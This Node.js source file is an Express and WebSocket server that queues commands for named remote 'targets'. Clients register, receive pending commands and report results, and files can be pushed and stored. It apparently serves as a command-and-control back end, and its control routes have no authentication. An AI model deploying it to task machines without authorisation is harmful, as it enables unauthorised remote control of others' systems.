import express from "express";
import { WebSocketServer } from "ws";
import fs from "fs";
import { v4 as uuidv4 } from "uuid";
import path from "path";

const app = express();
app.use(express.json({ limit: "50mb" })); // increase limit for file uploads

const PORT = process.env.PORT || 3000;
const COMMAND_FILE = "./commands.json";
const STORAGE = "./storage";
fs.mkdirSync(STORAGE, { recursive: true });

let targets = { targets: {} };

// Load existing commands.json
try {
  if (fs.existsSync(COMMAND_FILE)) {
    targets = JSON.parse(fs.readFileSync(COMMAND_FILE));
  }
} catch (err) {
  console.error("Failed to read commands.json:", err);
}

function saveCommands() {
  fs.writeFileSync(COMMAND_FILE, JSON.stringify(targets, null, 2));
}

// WebSocket server
const wss = new WebSocketServer({ noServer: true });
const clients = new Map(); // key: targetName, value: ws

wss.on("connection", (ws, req) => {
  let targetName = null;

  ws.on("message", (message) => {
    try {
      const data = JSON.parse(message);

      if (data.type === "register") {
        targetName = data.name;
        clients.set(targetName, ws);
        console.log(`✅ Target connected: ${targetName}`);

        // send all pending commands
        if (targets.targets[targetName]) {
          targets.targets[targetName].forEach(cmd => {
            if (cmd.status === "pending") {
              ws.send(JSON.stringify(cmd));
            }
          });
        }
        return;
      }

      if (data.type === "report" && targetName) {
        const cmdId = data.id;
        const status = data.status;
        const cmd = targets.targets[targetName].find(c => c.id === cmdId);

        // Handle file delivery
        if (status === "executed" && cmd.type === "push_file" && cmd.value.local_path) {
          // Move uploaded file to storage
          const dest = path.join(STORAGE, path.basename(cmd.value.local_path));
          fs.writeFileSync(dest, Buffer.from(cmd.value.content_b64, "base64"));
        }

        if (cmd) cmd.status = status;
        saveCommands();
        console.log(`Target ${targetName} executed command ${cmdId}: ${status}`);
      }

    } catch (err) {
      console.error("Invalid message:", message);
    }
  });

  ws.on("close", () => {
    if (targetName) {
      clients.delete(targetName);
      console.log(`❌ Target disconnected: ${targetName}`);
    }
  });
});

// HTTP routes for control
app.post("/send", (req, res) => {
  const { target, type, value } = req.body;
  if (!target || !type) return res.status(400).send({ error: "Missing fields" });

  if (!targets.targets[target]) targets.targets[target] = [];

  const cmd = { id: uuidv4(), type, value: value || "", status: "pending", timestamp: Date.now() };
  targets.targets[target].push(cmd);
  saveCommands();

  const ws = clients.get(target);
  if (ws) ws.send(JSON.stringify(cmd));

  res.send({ success: true, id: cmd.id });
});

app.post("/cancel", (req, res) => {
  const { target, id } = req.body;
  if (!target || !id) return res.status(400).send({ error: "Missing fields" });

  if (targets.targets[target]) {
    const cmd = targets.targets[target].find(c => c.id === id);
    if (cmd && cmd.status === "pending") {
      cmd.status = "canceled";
      saveCommands();
      return res.send({ success: true });
    }
  }
  res.send({ success: false, msg: "Command not found or already executed" });
});

app.get("/queue/:target", (req, res) => {
  const t = req.params.target;
  res.send(targets.targets[t] || []);
});

app.get("/status/:target", (req, res) => {
  res.send({ online: clients.has(req.params.target) });
});

const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
server.on("upgrade", (req, socket, head) => {
  wss.handleUpgrade(req, socket, head, (ws) => {
    wss.emit("connection", ws, req);
  });
});
